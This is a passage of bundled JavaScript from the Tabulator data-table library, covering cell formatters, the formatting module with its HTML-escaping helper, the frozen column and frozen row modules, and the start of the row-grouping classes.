  var invalid = typeof formatterParams.invalidPlaceholder !== "undefined" ? formatterParams.invalidPlaceholder : "";
  var value = cell.getValue();
  if (typeof DT != "undefined") {
    var newDatetime;
    if (DT.isDateTime(value)) {
      newDatetime = value;
    } else if (inputFormat === "iso") {
      newDatetime = DT.fromISO(String(value));
    } else {
      newDatetime = DT.fromFormat(String(value), inputFormat);
    }
    if (newDatetime.isValid) {
      if (formatterParams.timezone) {
        newDatetime = newDatetime.setZone(formatterParams.timezone);
      }
      return newDatetime.toFormat(outputFormat);
    } else {
      if (invalid === true || !value) {
        return value;
      } else if (typeof invalid === "function") {
        return invalid(value);
      } else {
        return invalid;
      }
    }
  } else {
    console.error("Format Error - 'datetime' formatter is dependant on luxon.js");
  }
}
function datetimediff(cell, formatterParams, onRendered) {
  var DT = this.table.dependencyRegistry.lookup(["luxon", "DateTime"], "DateTime");
  var inputFormat = formatterParams.inputFormat || "yyyy-MM-dd HH:mm:ss";
  var invalid = typeof formatterParams.invalidPlaceholder !== "undefined" ? formatterParams.invalidPlaceholder : "";
  var suffix = typeof formatterParams.suffix !== "undefined" ? formatterParams.suffix : false;
  var unit = typeof formatterParams.unit !== "undefined" ? formatterParams.unit : "days";
  var humanize = typeof formatterParams.humanize !== "undefined" ? formatterParams.humanize : false;
  var date2 = typeof formatterParams.date !== "undefined" ? formatterParams.date : DT.now();
  var value = cell.getValue();
  if (typeof DT != "undefined") {
    var newDatetime;
    if (DT.isDateTime(value)) {
      newDatetime = value;
    } else if (inputFormat === "iso") {
      newDatetime = DT.fromISO(String(value));
    } else {
      newDatetime = DT.fromFormat(String(value), inputFormat);
    }
    if (newDatetime.isValid) {
      if (humanize) {
        return newDatetime.diff(date2, unit).toHuman() + (suffix ? " " + suffix : "");
      } else {
        return parseInt(newDatetime.diff(date2, unit)[unit]) + (suffix ? " " + suffix : "");
      }
    } else {
      if (invalid === true) {
        return value;
      } else if (typeof invalid === "function") {
        return invalid(value);
      } else {
        return invalid;
      }
    }
  } else {
    console.error("Format Error - 'datetimediff' formatter is dependant on luxon.js");
  }
}
function lookup(cell, formatterParams, onRendered) {
  var value = cell.getValue();
  if (typeof formatterParams[value] === "undefined") {
    console.warn("Missing display value for " + value);
    return value;
  }
  return formatterParams[value];
}
function star(cell, formatterParams, onRendered) {
  var value = cell.getValue(), element = cell.getElement(), maxStars = formatterParams && formatterParams.stars ? formatterParams.stars : 5, stars = document.createElement("span"), star2 = document.createElementNS("http://www.w3.org/2000/svg", "svg"), starActive = '<polygon fill="#FFEA00" stroke="#C1AB60" stroke-width="37.6152" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" points="259.216,29.942 330.27,173.919 489.16,197.007 374.185,309.08 401.33,467.31 259.216,392.612 117.104,467.31 144.25,309.08 29.274,197.007 188.165,173.919 "/>', starInactive = '<polygon fill="#D2D2D2" stroke="#686868" stroke-width="37.6152" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" points="259.216,29.942 330.27,173.919 489.16,197.007 374.185,309.08 401.33,467.31 259.216,392.612 117.104,467.31 144.25,309.08 29.274,197.007 188.165,173.919 "/>';
  stars.style.verticalAlign = "middle";
  star2.setAttribute("width", "14");
  star2.setAttribute("height", "14");
  star2.setAttribute("viewBox", "0 0 512 512");
  star2.setAttribute("xml:space", "preserve");
  star2.style.padding = "0 1px";
  value = value && !isNaN(value) ? parseInt(value) : 0;
  value = Math.max(0, Math.min(value, maxStars));
  for (var i2 = 1; i2 <= maxStars; i2++) {
    var nextStar = star2.cloneNode(true);
    nextStar.innerHTML = i2 <= value ? starActive : starInactive;
    stars.appendChild(nextStar);
  }
  element.style.whiteSpace = "nowrap";
  element.style.overflow = "hidden";
  element.style.textOverflow = "ellipsis";
  element.setAttribute("aria-label", value);
  return stars;
}
function traffic(cell, formatterParams, onRendered) {
  var value = this.sanitizeHTML(cell.getValue()) || 0, el = document.createElement("span"), max2 = formatterParams && formatterParams.max ? formatterParams.max : 100, min2 = formatterParams && formatterParams.min ? formatterParams.min : 0, colors = formatterParams && typeof formatterParams.color !== "undefined" ? formatterParams.color : ["red", "orange", "green"], color2 = "#666666", percent, percentValue;
  if (isNaN(value) || typeof cell.getValue() === "undefined") {
    return;
  }
  el.classList.add("tabulator-traffic-light");
  percentValue = parseFloat(value) <= max2 ? parseFloat(value) : max2;
  percentValue = parseFloat(percentValue) >= min2 ? parseFloat(percentValue) : min2;
  percent = (max2 - min2) / 100;
  percentValue = Math.round((percentValue - min2) / percent);
  switch (typeof colors) {
    case "string":
      color2 = colors;
      break;
    case "function":
      color2 = colors(value);
      break;
    case "object":
      if (Array.isArray(colors)) {
        var unit = 100 / colors.length;
        var index = Math.floor(percentValue / unit);
        index = Math.min(index, colors.length - 1);
        index = Math.max(index, 0);
        color2 = colors[index];
        break;
      }
  }
  el.style.backgroundColor = color2;
  return el;
}
function progress(cell, formatterParams = {}, onRendered) {
  var value = this.sanitizeHTML(cell.getValue()) || 0, element = cell.getElement(), max2 = formatterParams.max ? formatterParams.max : 100, min2 = formatterParams.min ? formatterParams.min : 0, legendAlign = formatterParams.legendAlign ? formatterParams.legendAlign : "center", percent, percentValue, color2, legend, legendColor;
  percentValue = parseFloat(value) <= max2 ? parseFloat(value) : max2;
  percentValue = parseFloat(percentValue) >= min2 ? parseFloat(percentValue) : min2;
  percent = (max2 - min2) / 100;
  percentValue = Math.round((percentValue - min2) / percent);
  switch (typeof formatterParams.color) {
    case "string":
      color2 = formatterParams.color;
      break;
    case "function":
      color2 = formatterParams.color(value);
      break;
    case "object":
      if (Array.isArray(formatterParams.color)) {
        let unit = 100 / formatterParams.color.length;
        let index = Math.floor(percentValue / unit);
        index = Math.min(index, formatterParams.color.length - 1);
        index = Math.max(index, 0);
        color2 = formatterParams.color[index];
        break;
      }
    default:
      color2 = "#2DC214";
  }
  switch (typeof formatterParams.legend) {
    case "string":
      legend = formatterParams.legend;
      break;
    case "function":
      legend = formatterParams.legend(value);
      break;
    case "boolean":
      legend = value;
      break;
    default:
      legend = false;
  }
  switch (typeof formatterParams.legendColor) {
    case "string":
      legendColor = formatterParams.legendColor;
      break;
    case "function":
      legendColor = formatterParams.legendColor(value);
      break;
    case "object":
      if (Array.isArray(formatterParams.legendColor)) {
        let unit = 100 / formatterParams.legendColor.length;
        let index = Math.floor(percentValue / unit);
        index = Math.min(index, formatterParams.legendColor.length - 1);
        index = Math.max(index, 0);
        legendColor = formatterParams.legendColor[index];
      }
      break;
    default:
      legendColor = "#000";
  }
  element.style.minWidth = "30px";
  element.style.position = "relative";
  element.setAttribute("aria-label", percentValue);
  var barEl = document.createElement("div");
  barEl.style.display = "inline-block";
  barEl.style.width = percentValue + "%";
  barEl.style.backgroundColor = color2;
  barEl.style.height = "100%";
  barEl.setAttribute("data-max", max2);
  barEl.setAttribute("data-min", min2);
  var barContainer = document.createElement("div");
  barContainer.style.position = "relative";
  barContainer.style.width = "100%";
  barContainer.style.height = "100%";
  if (legend) {
    var legendEl = document.createElement("div");
    legendEl.style.position = "absolute";
    legendEl.style.top = 0;
    legendEl.style.left = 0;
    legendEl.style.textAlign = legendAlign;
    legendEl.style.width = "100%";
    legendEl.style.color = legendColor;
    legendEl.innerHTML = legend;
  }
  onRendered(function() {
    if (!(cell instanceof CellComponent)) {
      var holderEl = document.createElement("div");
      holderEl.style.position = "absolute";
      holderEl.style.top = "4px";
      holderEl.style.bottom = "4px";
      holderEl.style.left = "4px";
      holderEl.style.right = "4px";
      element.appendChild(holderEl);
      element = holderEl;
    }
    element.appendChild(barContainer);
    barContainer.appendChild(barEl);
    if (legend) {
      barContainer.appendChild(legendEl);
    }
  });
  return "";
}
function color(cell, formatterParams, onRendered) {
  cell.getElement().style.backgroundColor = this.sanitizeHTML(cell.getValue());
  return "";
}
function buttonTick(cell, formatterParams, onRendered) {
  return '<svg enable-background="new 0 0 24 24" height="14" width="14" viewBox="0 0 24 24" xml:space="preserve" ><path fill="#2DC214" clip-rule="evenodd" d="M21.652,3.211c-0.293-0.295-0.77-0.295-1.061,0L9.41,14.34  c-0.293,0.297-0.771,0.297-1.062,0L3.449,9.351C3.304,9.203,3.114,9.13,2.923,9.129C2.73,9.128,2.534,9.201,2.387,9.351  l-2.165,1.946C0.078,11.445,0,11.63,0,11.823c0,0.194,0.078,0.397,0.223,0.544l4.94,5.184c0.292,0.296,0.771,0.776,1.062,1.07  l2.124,2.141c0.292,0.293,0.769,0.293,1.062,0l14.366-14.34c0.293-0.294,0.293-0.777,0-1.071L21.652,3.211z" fill-rule="evenodd"/></svg>';
}
function buttonCross(cell, formatterParams, onRendered) {
  return '<svg enable-background="new 0 0 24 24" height="14" width="14" viewBox="0 0 24 24" xml:space="preserve" ><path fill="#CE1515" d="M22.245,4.015c0.313,0.313,0.313,0.826,0,1.139l-6.276,6.27c-0.313,0.312-0.313,0.826,0,1.14l6.273,6.272  c0.313,0.313,0.313,0.826,0,1.14l-2.285,2.277c-0.314,0.312-0.828,0.312-1.142,0l-6.271-6.271c-0.313-0.313-0.828-0.313-1.141,0  l-6.276,6.267c-0.313,0.313-0.828,0.313-1.141,0l-2.282-2.28c-0.313-0.313-0.313-0.826,0-1.14l6.278-6.269  c0.313-0.312,0.313-0.826,0-1.14L1.709,5.147c-0.314-0.313-0.314-0.827,0-1.14l2.284-2.278C4.308,1.417,4.821,1.417,5.135,1.73  L11.405,8c0.314,0.314,0.828,0.314,1.141,0.001l6.276-6.267c0.312-0.312,0.826-0.312,1.141,0L22.245,4.015z"/></svg>';
}
function toggle(cell, formatterParams, onRendered) {
  var value = cell.getValue(), size = formatterParams.size || 15, sizePx = size + "px", containEl, switchEl, onValue = formatterParams.hasOwnProperty("onValue") ? formatterParams.onValue : true, offValue = formatterParams.hasOwnProperty("offValue") ? formatterParams.offValue : false, state = formatterParams.onTruthy ? value : value === onValue;
  containEl = document.createElement("div");
  containEl.classList.add("tabulator-toggle");
  if (state) {
    containEl.classList.add("tabulator-toggle-on");
    containEl.style.flexDirection = "row-reverse";
    if (formatterParams.onColor) {
      containEl.style.background = formatterParams.onColor;
    }
  } else {
    if (formatterParams.offColor) {
      containEl.style.background = formatterParams.offColor;
    }
  }
  containEl.style.width = 2.5 * size + "px";
  containEl.style.borderRadius = sizePx;
  if (formatterParams.clickable) {
    containEl.addEventListener("click", (e2) => {
      cell.setValue(state ? offValue : onValue);
    });
  }
  switchEl = document.createElement("div");
  switchEl.classList.add("tabulator-toggle-switch");
  switchEl.style.height = sizePx;
  switchEl.style.width = sizePx;
  switchEl.style.borderRadius = sizePx;
  containEl.appendChild(switchEl);
  return containEl;
}
function rownum(cell, formatterParams, onRendered) {
  var content = document.createElement("span");
  var row = cell.getRow();
  var table = cell.getTable();
  row.watchPosition((position) => {
    if (formatterParams.relativeToPage) {
      position += table.modules.page.getPageSize() * (table.modules.page.getPage() - 1);
    }
    content.innerText = position;
  });
  return content;
}
function handle(cell, formatterParams, onRendered) {
  cell.getElement().classList.add("tabulator-row-handle");
  return "<div class='tabulator-row-handle-box'><div class='tabulator-row-handle-bar'></div><div class='tabulator-row-handle-bar'></div><div class='tabulator-row-handle-bar'></div></div>";
}
function adaptable(cell, params, onRendered) {
  var lookup2, formatterFunc, formatterParams;
  function defaultLookup(cell2) {
    var value = cell2.getValue(), formatter = "plaintext";
    switch (typeof value) {
      case "boolean":
        formatter = "tickCross";
        break;
      case "string":
        if (value.includes("\n")) {
          formatter = "textarea";
        }
        break;
    }
    return formatter;
  }
  lookup2 = params.formatterLookup ? params.formatterLookup(cell) : defaultLookup(cell);
  if (params.paramsLookup) {
    formatterParams = typeof params.paramsLookup === "function" ? params.paramsLookup(lookup2, cell) : params.paramsLookup[lookup2];
  }
  formatterFunc = this.table.modules.format.lookupFormatter(lookup2);
  return formatterFunc.call(this, cell, formatterParams || {}, onRendered);
}
function array$2(cell, formatterParams, onRendered) {
  var delimiter = formatterParams.delimiter || ",", value = cell.getValue(), table = this.table, valueMap;
  if (formatterParams.valueMap) {
    if (typeof formatterParams.valueMap === "string") {
      valueMap = function(value2) {
        return value2.map((item) => {
          return Helpers.retrieveNestedData(table.options.nestedFieldSeparator, formatterParams.valueMap, item);
        });
      };
    } else {
      valueMap = formatterParams.valueMap;
    }
  }
  if (Array.isArray(value)) {
    if (valueMap) {
      value = valueMap(value);
    }
    return value.join(delimiter);
  } else {
    return value;
  }
}
function json$1(cell, formatterParams, onRendered) {
  var indent = formatterParams.indent || "	", multiline = typeof formatterParams.multiline === "undefined" ? true : formatterParams.multiline, replacer = formatterParams.replacer || null, value = cell.getValue();
  if (multiline) {
    cell.getElement().style.whiteSpace = "pre-wrap";
  }
  return JSON.stringify(value, replacer, indent);
}
var defaultFormatters = {
  plaintext,
  html,
  textarea,
  money,
  link,
  image,
  tickCross,
  datetime: datetime$1,
  datetimediff,
  lookup,
  star,
  traffic,
  progress,
  color,
  buttonTick,
  buttonCross,
  toggle,
  rownum,
  handle,
  adaptable,
  array: array$2,
  json: json$1
};
let Format$1 = class Format extends Module {
  static moduleName = "format";
  //load defaults
  static formatters = defaultFormatters;
  constructor(table) {
    super(table);
    this.registerColumnOption("formatter");
    this.registerColumnOption("formatterParams");
    this.registerColumnOption("formatterPrint");
    this.registerColumnOption("formatterPrintParams");
    this.registerColumnOption("formatterClipboard");
    this.registerColumnOption("formatterClipboardParams");
    this.registerColumnOption("formatterHtmlOutput");
    this.registerColumnOption("formatterHtmlOutputParams");
    this.registerColumnOption("titleFormatter");
    this.registerColumnOption("titleFormatterParams");
  }
  initialize() {
    this.subscribe("cell-format", this.formatValue.bind(this));
    this.subscribe("cell-rendered", this.cellRendered.bind(this));
    this.subscribe("column-layout", this.initializeColumn.bind(this));
    this.subscribe("column-format", this.formatHeader.bind(this));
  }
  //initialize column formatter
  initializeColumn(column) {
    column.modules.format = this.lookupTypeFormatter(column, "");
    if (typeof column.definition.formatterPrint !== "undefined") {
      column.modules.format.print = this.lookupTypeFormatter(column, "Print");
    }
    if (typeof column.definition.formatterClipboard !== "undefined") {
      column.modules.format.clipboard = this.lookupTypeFormatter(column, "Clipboard");
    }
    if (typeof column.definition.formatterHtmlOutput !== "undefined") {
      column.modules.format.htmlOutput = this.lookupTypeFormatter(column, "HtmlOutput");
    }
  }
  lookupTypeFormatter(column, type) {
    var config = { params: column.definition["formatter" + type + "Params"] || {} }, formatter = column.definition["formatter" + type];
    config.formatter = this.lookupFormatter(formatter);
    return config;
  }
  lookupFormatter(formatter) {
    var formatterFunc;
    switch (typeof formatter) {
      case "string":
        if (Format.formatters[formatter]) {
          formatterFunc = Format.formatters[formatter];
        } else {
          console.warn("Formatter Error - No such formatter found: ", formatter);
          formatterFunc = Format.formatters.plaintext;
        }
        break;
      case "function":
        formatterFunc = formatter;
        break;
      default:
        formatterFunc = Format.formatters.plaintext;
        break;
    }
    return formatterFunc;
  }
  cellRendered(cell) {
    if (cell.modules.format && cell.modules.format.renderedCallback && !cell.modules.format.rendered) {
      cell.modules.format.renderedCallback();
      cell.modules.format.rendered = true;
    }
  }
  //return a formatted value for a column header
  formatHeader(column, title, el) {
    var formatter, params, onRendered, mockCell;
    if (column.definition.titleFormatter) {
      formatter = this.lookupFormatter(column.definition.titleFormatter);
      onRendered = (callback) => {
        column.titleFormatterRendered = callback;
      };
      mockCell = {
        getValue: function() {
          return title;
        },
        getElement: function() {
          return el;
        },
        getType: function() {
          return "header";
        },
        getColumn: function() {
          return column.getComponent();
        },
        getTable: () => {
          return this.table;
        }
      };
      params = column.definition.titleFormatterParams || {};
      params = typeof params === "function" ? params() : params;
      return formatter.call(this, mockCell, params, onRendered);
    } else {
      return title;
    }
  }
  //return a formatted value for a cell
  formatValue(cell) {
    var component = cell.getComponent(), params = typeof cell.column.modules.format.params === "function" ? cell.column.modules.format.params(component) : cell.column.modules.format.params;
    function onRendered(callback) {
      if (!cell.modules.format) {
        cell.modules.format = {};
      }
      cell.modules.format.renderedCallback = callback;
      cell.modules.format.rendered = false;
    }
    return cell.column.modules.format.formatter.call(this, component, params, onRendered);
  }
  formatExportValue(cell, type) {
    var formatter = cell.column.modules.format[type], params;
    if (formatter) {
      let onRendered = function(callback) {
        if (!cell.modules.format) {
          cell.modules.format = {};
        }
        cell.modules.format.renderedCallback = callback;
        cell.modules.format.rendered = false;
      };
      params = typeof formatter.params === "function" ? formatter.params(cell.getComponent()) : formatter.params;
      return formatter.formatter.call(this, cell.getComponent(), params, onRendered);
    } else {
      return this.formatValue(cell);
    }
  }
  sanitizeHTML(value) {
    if (value) {
      var entityMap = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;",
        "/": "&#x2F;",
        "`": "&#x60;",
        "=": "&#x3D;"
      };
      return String(value).replace(/[&<>"'`=/]/g, function(s2) {
        return entityMap[s2];
      });
    } else {
      return value;
    }
  }
  emptyToSpace(value) {
    return value === null || typeof value === "undefined" || value === "" ? "&nbsp;" : value;
  }
};
class FrozenColumns extends Module {
  static moduleName = "frozenColumns";
  constructor(table) {
    super(table);
    this.leftColumns = [];
    this.rightColumns = [];
    this.initializationMode = "left";
    this.active = false;
    this.blocked = true;
    this.registerColumnOption("frozen");
  }
  //reset initial state
  reset() {
    this.initializationMode = "left";
    this.leftColumns = [];
    this.rightColumns = [];
    this.active = false;
  }
  initialize() {
    this.subscribe("cell-layout", this.layoutCell.bind(this));
    this.subscribe("column-init", this.initializeColumn.bind(this));
    this.subscribe("column-width", this.layout.bind(this));
    this.subscribe("row-layout-after", this.layoutRow.bind(this));
    this.subscribe("table-layout", this.layout.bind(this));
    this.subscribe("columns-loading", this.reset.bind(this));
    this.subscribe("column-add", this.reinitializeColumns.bind(this));
    this.subscribe("column-deleted", this.reinitializeColumns.bind(this));
    this.subscribe("column-hide", this.reinitializeColumns.bind(this));
    this.subscribe("column-show", this.reinitializeColumns.bind(this));
    this.subscribe("columns-loaded", this.reinitializeColumns.bind(this));
    this.subscribe("table-redraw", this.layout.bind(this));
    this.subscribe("layout-refreshing", this.blockLayout.bind(this));
    this.subscribe("layout-refreshed", this.unblockLayout.bind(this));
    this.subscribe("scrollbar-vertical", this.adjustForScrollbar.bind(this));
  }
  blockLayout() {
    this.blocked = true;
  }
  unblockLayout() {
    this.blocked = false;
  }
  layoutCell(cell) {
    this.layoutElement(cell.element, cell.column);
  }
  reinitializeColumns() {
    this.reset();
    this.table.columnManager.columnsByIndex.forEach((column) => {
      this.initializeColumn(column);
    });
    this.layout();
  }
  //initialize specific column
  initializeColumn(column) {
    var config = { margin: 0, edge: false };
    if (!column.isGroup) {
      if (this.frozenCheck(column)) {
        config.position = this.initializationMode;
        if (this.initializationMode == "left") {
          this.leftColumns.push(column);
        } else {
          this.rightColumns.unshift(column);
        }
        this.active = true;
        column.modules.frozen = config;
      } else {
        this.initializationMode = "right";
      }
    }
  }
  frozenCheck(column) {
    if (column.parent.isGroup && column.definition.frozen) {
      console.warn("Frozen Column Error - Parent column group must be frozen, not individual columns or sub column groups");
    }
    if (column.parent.isGroup) {
      return this.frozenCheck(column.parent);
    } else {
      return column.definition.frozen;
    }
  }
  //layout calculation rows
  layoutCalcRows() {
    if (this.table.modExists("columnCalcs")) {
      if (this.table.modules.columnCalcs.topInitialized && this.table.modules.columnCalcs.topRow) {
        this.layoutRow(this.table.modules.columnCalcs.topRow);
      }
      if (this.table.modules.columnCalcs.botInitialized && this.table.modules.columnCalcs.botRow) {
        this.layoutRow(this.table.modules.columnCalcs.botRow);
      }
      if (this.table.modExists("groupRows")) {
        this.layoutGroupCalcs(this.table.modules.groupRows.getGroups());
      }
    }
  }
  layoutGroupCalcs(groups) {
    groups.forEach((group) => {
      if (group.calcs.top) {
        this.layoutRow(group.calcs.top);
      }
      if (group.calcs.bottom) {
        this.layoutRow(group.calcs.bottom);
      }
      if (group.groupList && group.groupList.length) {
        this.layoutGroupCalcs(group.groupList);
      }
    });
  }
  //calculate column positions and layout headers
  layoutColumnPosition(allCells) {
    var leftParents = [];
    var leftMargin = 0;
    var rightMargin = 0;
    this.leftColumns.forEach((column, i2) => {
      column.modules.frozen.marginValue = leftMargin;
      column.modules.frozen.margin = column.modules.frozen.marginValue + "px";
      if (column.visible) {
        leftMargin += column.getWidth();
      }
      if (i2 == this.leftColumns.length - 1) {
        column.modules.frozen.edge = true;
      } else {
        column.modules.frozen.edge = false;
      }
      if (column.parent.isGroup) {
        var parentEl = this.getColGroupParentElement(column);
        if (!leftParents.includes(parentEl)) {
          this.layoutElement(parentEl, column);
          leftParents.push(parentEl);
        }
        parentEl.classList.toggle("tabulator-frozen-left", column.modules.frozen.edge && column.modules.frozen.position === "left");
        parentEl.classList.toggle("tabulator-frozen-right", column.modules.frozen.edge && column.modules.frozen.position === "right");
      } else {
        this.layoutElement(column.getElement(), column);
      }
      if (allCells) {
        column.cells.forEach((cell) => {
          this.layoutElement(cell.getElement(true), column);
        });
      }
    });
    this.rightColumns.forEach((column, i2) => {
      column.modules.frozen.marginValue = rightMargin;
      column.modules.frozen.margin = column.modules.frozen.marginValue + "px";
      if (column.visible) {
        rightMargin += column.getWidth();
      }
      if (i2 == this.rightColumns.length - 1) {
        column.modules.frozen.edge = true;
      } else {
        column.modules.frozen.edge = false;
      }
      if (column.parent.isGroup) {
        this.layoutElement(this.getColGroupParentElement(column), column);
      } else {
        this.layoutElement(column.getElement(), column);
      }
      if (allCells) {
        column.cells.forEach((cell) => {
          this.layoutElement(cell.getElement(true), column);
        });
      }
    });
  }
  getColGroupParentElement(column) {
    return column.parent.isGroup ? this.getColGroupParentElement(column.parent) : column.getElement();
  }
  //layout columns appropriately
  layout() {
    if (this.active && !this.blocked) {
      this.layoutColumnPosition();
      this.reinitializeRows();
      this.layoutCalcRows();
    }
  }
  reinitializeRows() {
    var visibleRows = this.table.rowManager.getVisibleRows(true);
    var otherRows = this.table.rowManager.getRows().filter((row) => !visibleRows.includes(row));
    otherRows.forEach((row) => {
      row.deinitialize();
    });
    visibleRows.forEach((row) => {
      if (row.type === "row") {
        this.layoutRow(row);
      }
    });
  }
  layoutRow(row) {
    if (this.table.options.layout === "fitDataFill" && this.rightColumns.length) {
      this.table.rowManager.getTableElement().style.minWidth = "calc(100% - " + this.rightMargin + ")";
    }
    this.leftColumns.forEach((column) => {
      var cell = row.getCell(column);
      if (cell) {
        this.layoutElement(cell.getElement(true), column);
      }
    });
    this.rightColumns.forEach((column) => {
      var cell = row.getCell(column);
      if (cell) {
        this.layoutElement(cell.getElement(true), column);
      }
    });
  }
  layoutElement(element, column) {
    var position;
    if (column.modules.frozen && element) {
      element.style.position = "sticky";
      if (this.table.rtl) {
        position = column.modules.frozen.position === "left" ? "right" : "left";
      } else {
        position = column.modules.frozen.position;
      }
      element.style[position] = column.modules.frozen.margin;
      element.classList.add("tabulator-frozen");
      element.classList.toggle("tabulator-frozen-left", column.modules.frozen.edge && column.modules.frozen.position === "left");
      element.classList.toggle("tabulator-frozen-right", column.modules.frozen.edge && column.modules.frozen.position === "right");
    }
  }
  adjustForScrollbar(width) {
    if (this.rightColumns.length) {
      this.table.columnManager.getContentsElement().style.width = "calc(100% - " + width + "px)";
    }
  }
  getFrozenColumns() {
    return this.leftColumns.concat(this.rightColumns);
  }
  _calcSpace(columns, index) {
    var width = 0;
    for (let i2 = 0; i2 < index; i2++) {
      if (columns[i2].visible) {
        width += columns[i2].getWidth();
      }
    }
    return width;
  }
}
class FrozenRows extends Module {
  static moduleName = "frozenRows";
  constructor(table) {
    super(table);
    this.topElement = document.createElement("div");
    this.rows = [];
    this.registerComponentFunction("row", "freeze", this.freezeRow.bind(this));
    this.registerComponentFunction("row", "unfreeze", this.unfreezeRow.bind(this));
    this.registerComponentFunction("row", "isFrozen", this.isRowFrozen.bind(this));
    this.registerTableOption("frozenRowsField", "id");
    this.registerTableOption("frozenRows", false);
  }
  initialize() {
    var fragment = document.createDocumentFragment();
    this.rows = [];
    this.topElement.classList.add("tabulator-frozen-rows-holder");
    fragment.appendChild(document.createElement("br"));
    fragment.appendChild(this.topElement);
    this.table.columnManager.getContentsElement().insertBefore(fragment, this.table.columnManager.headersElement.nextSibling);
    this.subscribe("row-deleting", this.detachRow.bind(this));
    this.subscribe("rows-visible", this.visibleRows.bind(this));
    this.registerDisplayHandler(this.getRows.bind(this), 10);
    if (this.table.options.frozenRows) {
      this.subscribe("data-processed", this.initializeRows.bind(this));
      this.subscribe("row-added", this.initializeRow.bind(this));
      this.subscribe("table-redrawing", this.resizeHolderWidth.bind(this));
      this.subscribe("column-resized", this.resizeHolderWidth.bind(this));
      this.subscribe("column-show", this.resizeHolderWidth.bind(this));
      this.subscribe("column-hide", this.resizeHolderWidth.bind(this));
    }
    this.resizeHolderWidth();
  }
  resizeHolderWidth() {
    this.topElement.style.minWidth = this.table.columnManager.headersElement.offsetWidth + "px";
  }
  initializeRows() {
    this.table.rowManager.getRows().forEach((row) => {
      this.initializeRow(row);
    });
  }
  initializeRow(row) {
    var frozenRows = this.table.options.frozenRows, rowType = typeof frozenRows;
    if (rowType === "number") {
      if (row.getPosition() && row.getPosition() + this.rows.length <= frozenRows) {
        this.freezeRow(row);
      }
    } else if (rowType === "function") {
      if (frozenRows.call(this.table, row.getComponent())) {
        this.freezeRow(row);
      }
    } else if (Array.isArray(frozenRows)) {
      if (frozenRows.includes(row.data[this.options("frozenRowsField")])) {
        this.freezeRow(row);
      }
    }
  }
  isRowFrozen(row) {
    var index = this.rows.indexOf(row);
    return index > -1;
  }
  isFrozen() {
    return !!this.rows.length;
  }
  visibleRows(viewable, rows2) {
    this.rows.forEach((row) => {
      rows2.push(row);
    });
    return rows2;
  }
  //filter frozen rows out of display data
  getRows(rows2) {
    var output = rows2.slice(0);
    this.rows.forEach(function(row) {
      var index = output.indexOf(row);
      if (index > -1) {
        output.splice(index, 1);
      }
    });
    return output;
  }
  freezeRow(row) {
    if (!row.modules.frozen) {
      row.modules.frozen = true;
      this.topElement.appendChild(row.getElement());
      row.initialize();
      row.normalizeHeight();
      this.rows.push(row);
      this.refreshData(false, "display");
      this.table.rowManager.adjustTableSize();
      this.styleRows();
    } else {
      console.warn("Freeze Error - Row is already frozen");
    }
  }
  unfreezeRow(row) {
    if (row.modules.frozen) {
      row.modules.frozen = false;
      this.detachRow(row);
      this.table.rowManager.adjustTableSize();
      this.refreshData(false, "display");
      if (this.rows.length) {
        this.styleRows();
      }
    } else {
      console.warn("Freeze Error - Row is already unfrozen");
    }
  }
  detachRow(row) {
    var index = this.rows.indexOf(row);
    if (index > -1) {
      var rowEl = row.getElement();
      if (rowEl.parentNode) {
        rowEl.parentNode.removeChild(rowEl);
      }
      this.rows.splice(index, 1);
    }
  }
  styleRows(row) {
    this.rows.forEach((row2, i2) => {
      this.table.rowManager.styleRow(row2, i2);
    });
  }
}
class GroupComponent {
  constructor(group) {
    this._group = group;
    this.type = "GroupComponent";
    return new Proxy(this, {
      get: function(target, name, receiver) {
        if (typeof target[name] !== "undefined") {
          return target[name];
        } else {
          return target._group.groupManager.table.componentFunctionBinder.handle("group", target._group, name);
        }
      }
    });
  }
  getKey() {
    return this._group.key;
  }
  getField() {
    return this._group.field;
  }
  getElement() {
    return this._group.element;
  }
  getRows() {
    return this._group.getRows(true);
  }
  getSubGroups() {
    return this._group.getSubGroups(true);
  }
  getParentGroup() {
    return this._group.parent ? this._group.parent.getComponent() : false;
  }
  isVisible() {
    return this._group.visible;
  }
  show() {
    this._group.show();
  }
  hide() {
    this._group.hide();
  }
  toggle() {
    this._group.toggleVisibility();
  }
  scrollTo(position, ifVisible) {
    return this._group.groupManager.table.rowManager.scrollToRow(this._group, position, ifVisible);
  }
  _getSelf() {
    return this._group;
  }
  getTable() {
    return this._group.groupManager.table;
  }
}
class Group {
  constructor(groupManager, parent, level, key, field, generator, oldGroup) {
    this.groupManager = groupManager;
    this.parent = parent;
    this.key = key;
    this.level = level;
    this.field = field;
    this.hasSubGroups = level < groupManager.groupIDLookups.length - 1;
    this.addRow = this.hasSubGroups ? this._addRowToGroup : this._addRow;
    this.type = "group";
    this.old = oldGroup;
    this.rows = [];
    this.groups = [];
    this.groupList = [];
    this.generator = generator;
    this.element = false;
    this.elementContents = false;
    this.height = 0;
    this.outerHeight = 0;
    this.initialized = false;
    this.calcs = {};
    this.initialized = false;
    this.modules = {};
    this.arrowElement = false;
    this.visible = oldGroup ? oldGroup.visible : typeof groupManager.startOpen[level] !== "undefined" ? groupManager.startOpen[level] : groupManager.startOpen[0];
    this.component = null;
    this.createElements();
    this.addBindings();
    this.createValueGroups();
  }
  wipe(elementsOnly) {
    if (!elementsOnly) {
      if (this.groupList.length) {
        this.groupList.forEach(function(group) {
          group.wipe();
        });
      } else {
        this.rows.forEach((row) => {
          if (row.modules) {
            delete row.modules.group;
          }
        });
      }
    }
    this.element = false;
    this.arrowElement = false;
    this.elementContents = false;
  }
  createElements() {
    var arrow2 = document.createElement("div");
    arrow2.classList.add("tabulator-arrow");
    this.element = document.createElement("div");
    this.element.classList.add("tabulator-row");
    this.element.classList.add("tabulator-group");
    this.element.classList.add("tabulator-group-level-" + this.level);
    this.element.setAttribute("role", "rowgroup");
    this.arrowElement = document.createElement("div");
    this.arrowElement.classList.add("tabulator-group-toggle");
    this.arrowElement.appendChild(arrow2);
    if (this.groupManager.table.options.movableRows !== false && this.groupManager.table.modExists("moveRow")) {
      this.groupManager.table.modules.moveRow.initializeGroupHeader(this);
    }
  }
  createValueGroups() {
    var level = this.level + 1;
    if (this.groupManager.allowedValues && this.groupManager.allowedValues[level]) {
      this.groupManager.allowedValues[level].forEach((value) => {
        this._createGroup(value, level);
      });
    }
  }
  addBindings() {
    var toggleElement;
    if (this.groupManager.table.options.groupToggleElement) {
